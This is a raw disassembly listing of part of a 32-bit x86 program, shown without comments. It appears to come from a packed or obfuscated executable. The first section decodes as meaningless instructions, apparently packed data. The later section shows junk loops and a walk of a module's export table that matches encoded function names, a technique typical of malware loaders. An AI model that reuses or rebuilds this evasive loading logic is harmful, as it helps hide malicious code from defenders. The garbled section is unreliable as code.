  40ff51:	pop    ss
  40ff52:	call   0xc7b:0x954fb883
  40ff59:	xchg   edi,eax
  40ff5a:	in     al,dx
  40ff5b:	add    al,BYTE PTR [edi-0x38628e26]
  40ff61:	xchg   esi,eax
  40ff62:	stos   DWORD PTR es:[edi],eax
  40ff63:	loopne 0x40fee7
  40ff65:	fwait
  40ff66:	in     eax,0x7
  40ff68:	lods   eax,DWORD PTR ds:[esi]
  40ff69:	inc    esi
  40ff6a:	push   esp
  40ff6b:	dec    esi
  40ff6c:	dec    ebp
  40ff6d:	adc    eax,0x2466a23d
  40ff72:	xchg   BYTE PTR ds:0x5ba1dd52,cl
  40ff78:	pop    ebp
  40ff79:	mov    al,0xc2
  40ff7b:	mov    WORD PTR [edx],gs
  40ff7d:	in     al,0x60
  40ff7f:	les    eax,FWORD PTR [edi]
  40ff81:	ficomp DWORD PTR [esi+0x65]
  40ff84:	jae    0x40ffa4
  40ff86:	adc    DWORD PTR [edi],edx
  40ff88:	mov    eax,0xa804f407
  40ff8d:	test   DWORD PTR [ecx],ebx
  40ff8f:	mov    dl,0x96
  40ff91:	jne    0x40ff85
  40ff93:	(bad)  
  40ff94:	pushf  
  40ff95:	jnp    0x40ff17
  40ff97:	mov    ch,0x53
  40ff99:	(bad)  
  40ff9b:	adc    DWORD PTR [edi+ecx*4],esp
  40ff9e:	inc    esp
  40ff9f:	add    bl,BYTE PTR [esi+0x70]
  40ffa2:	push   ss
  40ffa3:	addr16 push edi
  40ffa5:	(bad)  
  40ffa7:	jbe    0x40ffe9
  40ffa9:	pushf  
  40ffaa:	xor    BYTE PTR [esi-0x3c],al
  40ffad:	pop    eax
  40ffae:	inc    edx
  40ffaf:	pop    esi
  40ffb0:	sub    BYTE PTR [esi],al
  40ffb2:	test   ch,dl
  40ffb4:	adc    eax,0x4f889144
  40ffb9:	xchg   esp,eax
  40ffba:	(bad)  
  40ffbb:	pop    DWORD PTR [eax]
  40ffbd:	jnp    0x40ff7e
  40ffbf:	pop    ebp
  40ffc0:	mov    edi,0x91091583
  40ffc5:	mov    ecx,0xd235b3ae
  40ffca:	fistp  WORD PTR [ecx-0x5991ed6d]
  40ffd0:	loope  0x40ffad
  40ffd2:	push   esi
  40ffd3:	retf   
  40ffd4:	fdivr  QWORD PTR [edx-0x70928f89]
  40ffda:	xor    ebx,DWORD PTR [edi]
  40ffdc:	jge    0x40ff85
  40ffde:	popa   
  40ffdf:	jnp    0x40ff84
  40ffe1:	ds sub eax,0x737c84e3
  40ffe7:	xor    dl,BYTE PTR [edi]
  40ffe9:	and    al,0x65
  40ffeb:	mov    eax,ds:0x41469e73
  40fff0:	or     eax,0xffffff96
  40fff3:	push   edi
  40fff4:	push   ecx
  40fff5:	inc    ebp
  40fff6:	je     0x41002b
  40fff8:	jg     0x40ffce
  40fffa:	mov    al,0xd1
  40fffc:	not    DWORD PTR [ebp-0x3a360f24]
  410002:	xor    dl,al
  410004:	add    esi,DWORD PTR [edi+0x303561e6]
  41000a:	cmc    
  41000b:	test   dh,0x17
  41000e:	stos   BYTE PTR es:[edi],al
  41000f:	sub    ch,BYTE PTR [ecx+0x6777a979]
  410015:	jb     0x410043
  410017:	sub    BYTE PTR [eax],0x55
  41001a:	popa   
  41001b:	(bad)  
  41001c:	and    al,al
  41001e:	mov    DWORD PTR [ebx+0x34554c9f],eax
  410024:	sub    eax,0x3a539e1b
  410029:	push   eax
  41002a:	mov    BYTE PTR [edi-0x41],bh
  41002d:	mov    ?,esi
  41002f:	fs jns 0x4100a2
  410032:	cmc    
  410033:	into   
  410034:	idiv   DWORD PTR [esi+ebx*8]
  410037:	cmp    bl,BYTE PTR [ebp+0x20]
  41003a:	call   0xc9f1:0x8449005d
  410041:	inc    edi
  410042:	mov    ch,0xf4
  410044:	data16 jo 0x410061
  410047:	jo     0x4100b4
  410049:	test   DWORD PTR [ecx],ebx
  41004b:	jmp    0x410040
  41004d:	and    al,0xb9
  41004f:	add    edx,ebp
  410051:	and    al,0xa0
  410053:	inc    ebx
  410054:	jnp    0x410033
  410056:	xchg   esp,eax
  410057:	aaa    
  410058:	(bad)  
  410059:	push   ebp
  41005a:	iret   
  41005b:	jo     0x410098
  41005d:	pop    esp
  41005e:	pop    ecx
  41005f:	call   0x5179268d
  410064:	adc    edx,DWORD PTR [esi+0x51]
  410067:	mov    edi,DWORD PTR [esi+0x67]
  41006a:	inc    ebx
  41006b:	adc    ebx,edx
  41006d:	pop    edi
  41006e:	jp     0x41002b
  410070:	fadd   st,st(2)
  410072:	xchg   esi,eax
  410073:	icebp  
  410074:	lods   eax,DWORD PTR ds:[esi]
  410075:	adc    cl,BYTE PTR [esi-0x7e9c8cbf]
  41007b:	dec    edx
  41007c:	jno    0x410012
  41007e:	sbb    DWORD PTR [ecx+ebp*4-0x4cab403a],0x32
  410086:	icebp  
  410087:	fist   WORD PTR [ebp+0x7e50686]
  41008d:	fisttp WORD PTR [ebp-0x2a]
  410090:	pop    edx
  410092:	inc    esp
  410093:	and    DWORD PTR [edx],0x71d95124
  410099:	lock and DWORD PTR [ebp+0x61166d61],esp
  4100a0:	jbe    0x4100f6
  4100a2:	and    al,0xf7
  4100a4:	stos   BYTE PTR es:[edi],al
  4100a5:	lods   eax,DWORD PTR ds:[esi]
  4100a6:	sbb    DWORD PTR [edx-0xb],0x34b5120d
  4100ad:	and    edx,edx
  4100af:	push   esp
  4100b0:	jae    0x4100b4
  4100b2:	lods   al,BYTE PTR ds:[esi]
  4100b3:	aad    0x29
  4100b5:	shl    DWORD PTR [ebx+0x5b74e450],0x7f
  4100bc:	push   cs
  4100bd:	push   eax
  4100be:	popa   
  4100bf:	push   eax
  4100c0:	(bad)  [esi+0xf]
  4100c3:	and    BYTE PTR [ebp+0x640fc86b],0x8a
  4100ca:	push   ss
  4100cb:	leave  
  4100cc:	iret   
  4100cd:	repz cld 
  4100cf:	imul   edi,DWORD PTR ds:0xdd623b34,0xffffff90
  4100d6:	out    0x1,eax
  4100d8:	pop    esp
  4100d9:	retf   0x5323
  4100dc:	pop    esi
  4100dd:	imul   BYTE PTR [esi+0x1ad19d3]
  4100e3:	cmp    DWORD PTR [esi+0x32],ebx
  4100e6:	add    BYTE PTR [ebx-0x662a69dd],0x92
  4100ed:	jmp    0xc966:0xf296f68a
  4100f4:	cli    
  4100f5:	je     0x41008c
  4100f7:	or     ebp,DWORD PTR [esi]
  4100f9:	add    eax,0x4ada9710
  4100fe:	fsubr  DWORD PTR [ebp-0x56b056b2]
  410104:	xor    cl,BYTE PTR [ebp-0x7e223cc3]
  41010a:	shl    ch,1
  41010c:	sbb    BYTE PTR [esi-0xb],0x5e
  410110:	js     0x4100c5
  410112:	in     eax,0x19
  410114:	dec    ebp
  410115:	xlat   BYTE PTR ds:[ebx]
  410116:	and    eax,0x91efbbfb
  41011b:	push   cs
  41011c:	mov    bh,0x6d
  41011e:	inc    esi
  41011f:	mov    bl,0x47
  410121:	mov    eax,ds:0x3d7f27a5
  410126:	xchg   esp,eax
  410127:	mov    ebp,0xda836312
  41012c:	(bad)
  41012f:	add    BYTE PTR [ebx+ebp*8+0x78a111b5],ah
  410136:	adc    ebx,DWORD PTR [ebx]
  410138:	stos   BYTE PTR es:[edi],al
  410139:	jg     0x41010f
  41013b:	xchg   ebx,eax
  41013c:	inc    ebp
  41013d:	jo     0x4100fa
  41013f:	push   ds
  410140:	cmp    BYTE PTR ds:0x1d12ba5,al
  410146:	and    al,0xa2
  410148:	push   es
  410149:	inc    ecx
  41014a:	xchg   dh,dh
  41014c:	pop    ss
  41014d:	lods   eax,DWORD PTR ds:[esi]
  41014e:	mov    eax,DWORD PTR [edx-0x24]
  410151:	mov    ch,0x79
  410153:	adc    ah,ch
  410155:	mov    WORD PTR [edi+0x204b96c7],cs
  41015b:	repnz hlt 
  41015d:	cmp    BYTE PTR [ebx],ch
  41015f:	test   DWORD PTR [ebx-0x22],ebx
  410162:	ror    ch,1
  410164:	in     eax,dx
  410165:	or     al,0xb6
  410167:	mov    esp,0x73b86dd1
  41016c:	sub    ebp,DWORD PTR [esi]
  41016e:	mov    eax,DWORD PTR [edx]
  410170:	inc    esi
  410171:	mov    edi,0x4e25261f
  410176:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410177:	mov    ch,0xb6
  410179:	ret    0x94a8
  41017c:	les    edx,FWORD PTR ds:0xb125952
  410182:	dec    ebp
  410183:	stos   BYTE PTR es:[edi],al
  410184:	mov    BYTE PTR [edi+0x6b],ch
  410187:	cmp    al,bh
  410189:	cmovs  ecx,DWORD PTR [esp+ebx*2+0x7e40737f]
  410191:	cs dec esi
  410193:	or     al,0x46
  410195:	or     DWORD PTR [esi+0x56a7caf1],edx
  41019b:	push   eax
  41019c:	lds    eax,FWORD PTR [esi-0xd]
  41019f:	jo     0x4101e0
  4101a1:	rcr    BYTE PTR [eax-0x17],cl
  4101a4:	jge    0x410182
  4101a6:	cmc    
  4101a7:	pop    esi
  4101a8:	mov    bl,0x9f
  4101aa:	arpl   sp,di
  4101ac:	cmp    eax,0x3c0dabfd
  4101b1:	mov    ss,eax
  4101b3:	inc    ecx
  4101b4:	cmp    cl,al
  4101b6:	ror    BYTE PTR [edx+0x50265b3],1
  4101bc:	adc    bh,bh
  4101be:	xchg   ebx,eax
  4101bf:	sub    edx,0xffffffea
  4101c2:	xlat   BYTE PTR ds:[ebx]
  4101c3:	dec    ebx
  4101c4:	jmp    0x410175
  4101c6:	call   0xc271:0xba012904
  4101cd:	ret    0x1150
  4101d0:	mov    cl,0x26
  4101d2:	cwde   
  4101d3:	sub    ah,ch
  4101d5:	mov    DWORD PTR [edi],edi
  4101d7:	sar    BYTE PTR [eax+eax*4-0x3f],cl
  4101db:	inc    ebp
  4101dc:	mov    edi,0x2523f082
  4101e1:	js     0x410257
  4101e3:	(bad)  
  4101e4:	adc    bh,BYTE PTR [ebx]
  4101e6:	jl     0x410267
  4101e8:	sbb    eax,DWORD PTR [edx-0x76]
  4101eb:	es sahf 
  4101ed:	ret    
  4101ee:	es mov esp,0x4f1fc891
  4101f4:	sbb    eax,0x4785b7
  4101f9:	iret   
  4101fa:	shl    DWORD PTR [ebp+0x31ea4f81],1
  410200:	mov    cl,0xd2
  410202:	or     BYTE PTR [edx-0x7f5134d9],bh
  410208:	adc    esi,ecx
  41020a:	pop    ebp
  41020b:	outs   dx,BYTE PTR ds:[esi]
  41020c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41020d:	xor    eax,0x2324d55e
  410212:	push   edx
  410213:	jne    0x4101d5
  410215:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410217:	mov    esp,0x90f41ec5
  41021c:	fsubr  QWORD PTR [eiz*2+0x5534a82b]
  410223:	loopne 0x4101d2
  410225:	imul   esp,DWORD PTR [ecx-0x2e],0x2db96bf2
  41022c:	cwde   
  41022d:	fwait
  41022e:	jmp    ecx
  410230:	dec    ebx
  410231:	sub    BYTE PTR [esi+edx*4-0x1f2d4e0],cl
  410238:	or     ebp,DWORD PTR [ecx+0x20661fce]
  41023e:	shl    ah,1
  410240:	mov    ds:0x73580fbb,al
  410245:	leave  
  410246:	into   
  410247:	xchg   esi,eax
  410248:	clc    
  410249:	pop    edi
  41024a:	xchg   ch,ah
  41024c:	inc    edi
  41024d:	or     ebx,DWORD PTR [esi+0x77]
  410250:	int3   
  410251:	out    dx,al
  410252:	test   DWORD PTR [edi-0x47],edi
  410255:	or     al,0x22
  410257:	cld    
  410258:	fidiv  WORD PTR [esi]
  41025a:	mov    ds:0x8b457acc,eax
  41025f:	sub    ecx,DWORD PTR ds:0x6718d7ac
  410265:	fcmovnbe st,st(0)
  410267:	lds    edi,FWORD PTR [esi-0x3c]
  41026a:	mov    DWORD PTR [edi],ebp
  41026c:	jns    0x410254
  41026e:	imul   eax,DWORD PTR [ebp+0x23525017],0x941d4cd3
  410278:	adc    ah,BYTE PTR [edx]
  41027a:	push   0x35
  41027c:	test   edi,edi
  41027e:	xchg   ebp,eax
  41027f:	sahf   
  410280:	inc    esi
  410281:	xchg   ebp,eax
  410282:	dec    ecx
  410284:	pop    ecx
  410285:	lods   eax,DWORD PTR ds:[esi]
  410286:	and    DWORD PTR [edi+ecx*2-0x20acd522],esp
  41028d:	dec    ebx
  41028e:	xor    dl,BYTE PTR [edx+edx*4]
  410291:	imul   edx,DWORD PTR [esi],0xffffffd0
  410294:	cmp    BYTE PTR [edi+eiz*4-0x6e],bl
  410298:	mov    eax,0x3413f737
  41029d:	mov    ebp,0x27d24dfb
  4102a2:	jno    0x41030c
  4102a4:	das    
  4102a5:	mov    ecx,0x5931b775
  4102aa:	or     al,0x7c
  4102ac:	ja     0x410305
  4102ae:	push   esp
  4102af:	loop   0x410304
  4102b1:	je     0x410322
  4102b3:	mov    ds:0x589f46ca,al
  4102b8:	add    DWORD PTR [ebx],edi
  4102ba:	xchg   edx,eax
  4102bb:	lods   al,BYTE PTR ds:[esi]
  4102bc:	pop    eax
  4102bd:	sbb    dl,BYTE PTR [esi-0x57]
  4102c0:	mov    es,ecx
  4102c2:	dec    ecx
  4102c3:	push   esi
  4102c4:	sub    al,0x52
  4102c6:	jns    0x41030e
  4102c8:	div    BYTE PTR [ebp-0x3e]
  4102cb:	mov    dl,0x58
  4102cd:	jmp    0x9747:0xc17c3a4c
  4102d4:	shr    DWORD PTR [eax],0x4c
  4102d7:	das    
  4102d8:	mov    ebx,0x26fc0ca5
  4102dd:	lahf   
  4102de:	cmc    
  4102df:	in     eax,dx
  4102e0:	test   eax,0x9deac4d8
  4102e5:	mov    ebp,0xf3d31c2c
  4102ea:	mov    ecx,0x7fcef96a
  4102ef:	cmp    eax,0xa31be0cf
  4102f4:	imul   DWORD PTR [ecx+0x18]
  4102f7:	jg     0x41029a
  4102f9:	jp     0x410378
  4102fb:	lds    ecx,FWORD PTR [ecx]
  4102fd:	mov    WORD PTR ds:0xaa8553a0,?
  410303:	mov    es,WORD PTR [ecx]
  410305:	mov    ebp,ebp
  410307:	popf   
  410308:	mov    edx,0x43db3b6d
  41030d:	lods   al,BYTE PTR ds:[esi]
  41030e:	(bad)  
  41030f:	(bad)  
  410310:	bound  ecx,QWORD PTR [edx+ebx*2+0xc6e2507]
  410317:	jle    0x41032c
  410319:	fisubr DWORD PTR [ebx+eax*2-0x45]
  41031d:	adc    al,0x94
  41031f:	sbb    al,0x59
  410321:	movaps xmm2,XMMWORD PTR [ebp-0x7041e9c9]
  410328:	add    al,0x55
  41032a:	push   cs
  41032b:	in     eax,dx
  41032c:	cmp    esp,esp
  41032e:	jo     0x4102e6
  410330:	je     0x410332
  410332:	adc    edx,ebx
  410334:	push   0xe0e534e
  410339:	icebp  
  41033a:	ins    DWORD PTR es:[edi],dx
  41033b:	push   edi
  41033c:	gs xchg ebx,eax
  41033e:	out    0x8f,eax
  410340:	fnstsw WORD PTR [eax-0x5ca33f0]
  410346:	xchg   BYTE PTR [ebp+0x41ef1cb3],al
  41034c:	add    dl,cl
  41034e:	in     al,dx
  41034f:	and    al,0x32
  410351:	in     al,dx
  410352:	xchg   DWORD PTR [edx-0x5a],eax
  410355:	nop
  410356:	imul   ebp,DWORD PTR [edx+0x50],0x4f049a80
  41035d:	sti    
  41035e:	scas   eax,DWORD PTR es:[edi]
  41035f:	or     bh,0xf5
  410362:	loopne 0x410367
  410364:	mov    edi,0xb68497f3
  410369:	pop    ebp
  41036a:	mov    al,ds:0x4bbb9645
  41036f:	cmp    eax,DWORD PTR [eax]
  410371:	add    BYTE PTR [esi+0x2b],ah
  410374:	sti    
  410375:	mov    ebx,0x8a85
  41037a:	xor    di,bx
  41037d:	mov    ebx,0x4f8a
  410382:	cmp    di,bx
  410385:	jne    0x4103ad
  41038b:	movsx  di,BYTE PTR [eax]
  41038f:	mov    ebx,0x3b4b
  410394:	sub    di,bx
  410397:	mov    ebx,0x8a85
  41039c:	xor    di,bx
  41039f:	mov    ebx,0x4f87
  4103a4:	cmp    di,bx
  4103a7:	je     0x4103bd
  4103ad:	mov    edi,DWORD PTR [ebp-0x10]
  4103b0:	xor    edi,ecx
  4103b2:	mov    ebx,esi
  4103b4:	sub    ebx,edi
  4103b6:	add    eax,ebx
  4103b8:	jmp    0x40dfbd
  4103bd:	mov    esi,DWORD PTR [ebp-0x14]
  4103c0:	mov    esi,DWORD PTR [esi]
  4103c2:	mov    edi,DWORD PTR [eax+0x3c]
  4103c5:	lea    esi,[edi+esi*8+0x78]
  4103c9:	mov    esi,DWORD PTR [esi+eax*1]
  4103cc:	mov    DWORD PTR [ebp-0x8],esi
  4103cf:	mov    esi,DWORD PTR [ebp+0x8]
  4103d2:	xor    esi,ecx
  4103d4:	add    esi,edx
  4103d6:	mov    DWORD PTR [ebp-0x14],esi
  4103d9:	mov    esi,DWORD PTR [ebp+0x8]
  4103dc:	mov    edi,DWORD PTR [ebp-0x8]
  4103df:	xor    esi,ecx
  4103e1:	add    esi,edx
  4103e3:	pop    ebx
  4103e4:	cmp    edi,esi
  4103e6:	jne    0x410404
  4103ec:	mov    eax,DWORD PTR [ebp+0xc]
  4103ef:	xor    eax,ecx
  4103f1:	mov    ecx,DWORD PTR [ebp-0x8]
  4103f4:	add    eax,edx
  4103f6:	imul   eax,ecx
  4103f9:	mov    DWORD PTR [ebp-0x8],eax
  4103fc:	push   DWORD PTR [ebp+0x18]
  4103ff:	jmp    0x410458
  410404:	mov    ecx,DWORD PTR [ebp-0x8]
  410407:	add    ecx,eax
  410409:	mov    DWORD PTR [ebp-0x14],ecx
  41040c:	mov    ecx,DWORD PTR [ebp-0x14]
  41040f:	mov    ecx,DWORD PTR [ecx+0xc]
  410412:	movsx  cx,BYTE PTR [ecx+eax*1]
  410417:	mov    edx,0x3b4b
  41041c:	sub    cx,dx
  41041f:	mov    edx,0x8a85
  410424:	xor    cx,dx
  410427:	mov    edx,0x4f85
  41042c:	cmp    cx,dx
  41042f:	jne    0x4103fc
  410435:	mov    ecx,DWORD PTR ds:0x41d3dc
  41043b:	mov    ecx,DWORD PTR [ecx+0x198]
  410441:	mov    DWORD PTR [ecx],eax
  410443:	jmp    0x410469
  410448:	mov    ecx,DWORD PTR [ebp+0x18]
  41044b:	cmp    ecx,0xf89c85b5
  410451:	jne    0x410469
  410457:	push   eax
  410458:	push   DWORD PTR [ebp+0x14]
  41045b:	push   DWORD PTR [ebp+0x10]
  41045e:	push   DWORD PTR [ebp+0xc]
  410461:	push   DWORD PTR [ebp+0x8]
  410464:	call   0x40b7a6
  410469:	pop    edi
  41046a:	pop    esi
  41046b:	leave  
  41046c:	ret    0x14
  41046f:	push   ebp
  410470:	mov    ebp,esp
  410472:	sub    esp,0x48
  410475:	and    DWORD PTR ds:0x427018,0x0
  41047f:	mov    eax,ds:0x427018
  410484:	inc    eax
  410485:	mov    ds:0x427018,eax
  41048a:	cmp    DWORD PTR ds:0x427018,0xc
  410491:	jne    0x4104a6
  410497:	push   DWORD PTR [ebp-0xc]
  41049a:	push   DWORD PTR [ebp-0xc]
  41049d:	push   DWORD PTR [ebp-0x28]
  4104a0:	call   DWORD PTR ds:0x421028
  4104a6:	cmp    DWORD PTR ds:0x427018,0xb
  4104ad:	jne    0x4104be
  4104b3:	mov    eax,ds:0x427018
  4104b8:	inc    eax
  4104b9:	mov    ds:0x427018,eax
  4104be:	cmp    DWORD PTR ds:0x427018,0x1f
  4104c5:	jb     0x41047f
  4104cb:	adc    DWORD PTR ds:0x428010,ebx
  4104d1:	push   ebx
  4104d2:	mov    DWORD PTR ds:0x426010,0x1e
  4104dc:	cmp    DWORD PTR ds:0x426010,0x0
  4104e3:	je     0x410526
  4104e9:	cmp    DWORD PTR ds:0x426010,0x26
  4104f0:	jne    0x410501
  4104f6:	push   0x41ff82
  4104fb:	call   DWORD PTR ds:0x42102c
  410501:	xor    eax,eax
  410503:	xor    eax,DWORD PTR ds:0x426010
  410509:	dec    eax
  41050a:	mov    ds:0x426010,eax
  41050f:	jmp    0x4104dc
  410514:	movzx  eax,WORD PTR ds:0x427014
  41051b:	sub    eax,DWORD PTR ds:0x426004
  410521:	mov    ds:0x427014,eax
  410526:	push   esi
  410527:	push   edi
  410528:	and    DWORD PTR ds:0x428000,0x0
  410532:	jmp    0x410544
  410537:	mov    edi,DWORD PTR ds:0x428000
  41053d:	inc    edi
  41053e:	mov    DWORD PTR ds:0x428000,edi
  410544:	cmp    DWORD PTR ds:0x428000,0x1e
  41054b:	jae    0x410597
  410551:	cmp    DWORD PTR ds:0x428000,0x1f
  410558:	jne    0x41058c
  41055e:	push   DWORD PTR [ebp-0x28]
  410561:	push   0x3d00
  410566:	push   0x5480
  41056b:	push   DWORD PTR [ebp-0x10]
  41056e:	push   DWORD PTR [ebp-0x24]
  410571:	push   DWORD PTR [ebp-0x1c]
  410574:	push   0x6187
  410579:	push   DWORD PTR [ebp-0x20]
  41057c:	push   0x5fd8
  410581:	push   0x12ef
  410586:	call   DWORD PTR ds:0x421030
  41058c:	jmp    0x410537
  410591:	and    eax,DWORD PTR ds:0x426018
  410597:	xor    esi,esi
  410599:	and    DWORD PTR ds:0x428008,0x0
  4105a3:	jmp    0x4105b5
  4105a8:	mov    edi,DWORD PTR ds:0x428008
  4105ae:	inc    edi
  4105af:	mov    DWORD PTR ds:0x428008,edi
  4105b5:	cmp    DWORD PTR ds:0x428008,0x1e
  4105bc:	jae    0x4105ff
  4105c2:	cmp    DWORD PTR ds:0x428008,0xe
  4105c9:	jne    0x4105e0
  4105cf:	push   DWORD PTR [ebp-0x18]
  4105d2:	push   0x425020
  4105d7:	push   DWORD PTR [ebp-0x28]
  4105da:	call   DWORD PTR ds:0x421034
  4105e0:	cmp    DWORD PTR ds:0x428008,0xd
  4105e7:	jne    0x4105fa
  4105ed:	mov    edi,DWORD PTR ds:0x428008
  4105f3:	inc    edi
  4105f4:	mov    DWORD PTR ds:0x428008,edi
  4105fa:	jmp    0x4105a8
  4105ff:	mov    DWORD PTR [ebp-0x20],esi
  410602:	or     eax,edi
  410604:	mov    eax,DWORD PTR [ebp-0xc]
  410607:	push   0x21
  410609:	and    DWORD PTR ds:0x429004,edi
  41060f:	mov    DWORD PTR [ebp-0xc],eax
  410612:	add    edi,DWORD PTR ds:0x425020
  410618:	pop    edi
  410619:	add    DWORD PTR ds:0x425010,0x428010
  410623:	push   0x41d4f0
  410628:	call   DWORD PTR ds:0x421040
  41062e:	push   esi
  41062f:	and    DWORD PTR ds:0x425008,0x428018
  410639:	push   0x2
  41063b:	adc    DWORD PTR ds:0x425018,0x428008
  410645:	push   0x1
  410647:	xor    DWORD PTR ds:0x429004,0x425020
  410651:	push   0x2
  410653:	push   0x1
  410655:	add    DWORD PTR ds:0x42800c,0x158b
  41065f:	push   0x8678768
  410664:	push   0x87676776
  410669:	call   DWORD PTR ds:0x42100c
  41066f:	xor    DWORD PTR ds:0x427014,0x429004
  410679:	push   esi
  41067a:	add    DWORD PTR ds:0x42601c,0x4e21
  410684:	push   0x68
  410686:	and    DWORD PTR ds:0x425024,0x9b5
  410690:	push   0xd
  410692:	not    DWORD PTR ds:0x42501c
  410698:	push   0x5
  41069a:	or     DWORD PTR ds:0x425020,0x429010
  4106a4:	push   0x3
  4106a6:	push   0x5468787
  4106ab:	call   DWORD PTR ds:0x421024
  4106b1:	dec    edi
  4106b2:	mov    DWORD PTR ds:0x425010,0x709e
  4106bc:	jne    0x410619
  4106c2:	mov    eax,DWORD PTR [ebp-0xc]
  4106c5:	mov    DWORD PTR ds:0x425000,edi
  4106cb:	mov    ebx,0xf89c85b6
  4106d0:	cmp    eax,ebx
  4106d2:	mov    DWORD PTR ds:0x426014,0x6187
  4106dc:	jne    0x4107d8
  4106e2:	or     DWORD PTR ds:0x426008,0x425010
  4106ec:	mov    DWORD PTR ds:0x41d4ec,0xf89c85b5
  4106f6:	add    DWORD PTR ds:0x428014,0x8c5
  410700:	push   DWORD PTR [ebp+0x10]
  410703:	sbb    DWORD PTR ds:0x426004,0x426010
  41070d:	push   DWORD PTR [ebp+0xc]
  410710:	push   DWORD PTR [ebp+0x8]
  410713:	call   0x403cbf
  410718:	mov    DWORD PTR ds:0x426018,0x1f
  410722:	cmp    DWORD PTR ds:0x426018,0x0
  410729:	je     0x4107c2
  41072f:	cmp    DWORD PTR ds:0x426018,0xf
  410736:	jne    0x41074a
  41073c:	push   DWORD PTR [ebp-0x14]
  41073f:	push   0x348e
  410744:	call   DWORD PTR ds:0x421038
  41074a:	cmp    DWORD PTR ds:0x426018,0x10
  410751:	jne    0x410764
  410757:	mov    edi,DWORD PTR ds:0x426018
  41075d:	dec    edi
  41075e:	mov    DWORD PTR ds:0x426018,edi
  410764:	mov    edi,DWORD PTR ds:0x426018
  41076a:	dec    edi
  41076b:	mov    DWORD PTR ds:0x426018,edi
  410771:	jmp    0x410722
  410776:	and    DWORD PTR ds:0x429004,0x0
  410780:	mov    esi,DWORD PTR ds:0x429004
  410786:	inc    esi
  410787:	mov    DWORD PTR ds:0x429004,esi
  41078d:	cmp    DWORD PTR ds:0x429004,0x1f
  410794:	jne    0x4107b5
  41079a:	push   0x55b4
  41079f:	push   DWORD PTR [ebp-0x14]
  4107a2:	push   0x42600c
  4107a7:	push   0x45b8
  4107ac:	push   DWORD PTR [ebp-0x28]
  4107af:	call   DWORD PTR ds:0x421000
  4107b5:	cmp    DWORD PTR ds:0x429004,0x16
  4107bc:	jb     0x410780
  4107c2:	mov    ecx,DWORD PTR ds:0x41d3dc
  4107c8:	sub    esi,edi
  4107ca:	mov    ecx,DWORD PTR [ecx+0x1cc]
  4107d0:	and    edi,0x3fae
  4107d6:	mov    DWORD PTR [ecx],eax
  4107d8:	or     edi,DWORD PTR ds:0x425010
  4107de:	mov    DWORD PTR [ebp-0x4],ebx
  4107e1:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  4107e8:	lea    eax,[ebp-0x28]
  4107eb:	xor    DWORD PTR ds:0x425018,edx
  4107f1:	mov    DWORD PTR [ebp-0x20],eax
  4107f4:	sbb    edi,DWORD PTR ds:0x429010
  4107fa:	lea    eax,[ebp-0x2c]
  4107fd:	and    DWORD PTR ds:0x427014,0x0
  410807:	mov    edi,DWORD PTR ds:0x427014
  41080d:	inc    edi
  41080e:	mov    DWORD PTR ds:0x427014,edi
  410814:	cmp    DWORD PTR ds:0x427014,0x1d
  41081b:	jne    0x41082c
  410821:	push   0x45e3
  410826:	call   DWORD PTR ds:0x421004
  41082c:	cmp    DWORD PTR ds:0x427014,0x1c
  410833:	jb     0x410807
  410839:	sbb    DWORD PTR ds:0x42501c,edx
  41083f:	mov    DWORD PTR [ebp-0x1c],eax
  410842:	and    DWORD PTR ds:0x428010,0x0
  41084c:	mov    edi,DWORD PTR ds:0x428010
  410852:	inc    edi
  410853:	mov    DWORD PTR ds:0x428010,edi
  410859:	cmp    DWORD PTR ds:0x428010,0xd
  410860:	jne    0x410874
  410866:	push   0x41ffb1
  41086b:	push   DWORD PTR [ebp-0xc]
  41086e:	call   DWORD PTR ds:0x421008
  410874:	cmp    DWORD PTR ds:0x428010,0xc
  41087b:	jne    0x41088e
  410881:	mov    edi,DWORD PTR ds:0x428010
  410887:	inc    edi
  410888:	mov    DWORD PTR ds:0x428010,edi
  41088e:	cmp    DWORD PTR ds:0x428010,0x1b
  410895:	jb     0x41084c
  41089b:	and    edi,esi
  41089d:	mov    eax,ds:0x41d3dc
  4108a2:	sub    ecx,esi
  4108a4:	mov    eax,DWORD PTR [eax+0x1c8]
  4108aa:	mov    eax,DWORD PTR [eax]
  4108ac:	mov    ecx,DWORD PTR [ebp-0x1c]
  4108af:	not    edi
  4108b1:	mov    esi,0x7510893
  4108b6:	xor    eax,esi
  4108b8:	movzx  edi,BYTE PTR ds:0x425028
  4108bf:	add    DWORD PTR ds:0x427018,edi
  4108c5:	mov    edi,0x3272db
  4108ca:	adc    DWORD PTR ds:0x42601c,0x425018
  4108d4:	add    eax,edi
  4108d6:	mov    DWORD PTR ds:0x425000,0x302d
  4108e0:	mov    DWORD PTR [ecx],eax
  4108e2:	mov    DWORD PTR ds:0x429010,ebx
  4108e8:	mov    eax,ds:0x41d5d8
  4108ed:	mov    DWORD PTR ds:0x427008,0x286e
  4108f7:	cmp    eax,0x301ac8f5
  4108fc:	jne    0x41095e
  410902:	and    DWORD PTR ds:0x427000,0x0
  41090c:	xor    eax,eax
  41090e:	or     eax,DWORD PTR ds:0x427000
  410914:	inc    eax
  410915:	mov    ds:0x427000,eax
  41091a:	cmp    DWORD PTR ds:0x427000,0x19
  410921:	jne    0x410930
  410927:	push   DWORD PTR [ebp-0x28]
  41092a:	call   DWORD PTR ds:0x421048
  410930:	cmp    DWORD PTR ds:0x427000,0x17
  410937:	jb     0x41090c
  41093d:	mov    eax,DWORD PTR [ebp-0x4]
  410940:	mov    ecx,DWORD PTR ds:0x41d3dc
  410946:	mov    ecx,DWORD PTR [ecx+0x198]
  41094c:	xor    eax,esi
  41094e:	add    eax,edi
  410950:	mov    DWORD PTR [ecx],eax
  410952:	mov    eax,DWORD PTR [ebp-0x4]
  410955:	xor    eax,esi
  410957:	add    eax,edi
  410959:	mov    ds:0x41d5d8,eax
  41095e:	mov    eax,ds:0x41d3dc
  410963:	mov    eax,DWORD PTR [eax+0x18c]
  410969:	mov    eax,DWORD PTR [eax]
  41096b:	mov    DWORD PTR [ebp-0x30],eax
  41096e:	mov    eax,0xf89c85ba
  410973:	mov    DWORD PTR [ebp-0x1c],eax
  410976:	mov    DWORD PTR [ebp-0x1c],eax
  410979:	mov    DWORD PTR [ebp-0x1c],eax
  41097c:	mov    DWORD PTR [ebp-0x1c],ebx
  41097f:	mov    DWORD PTR [ebp-0x38],eax
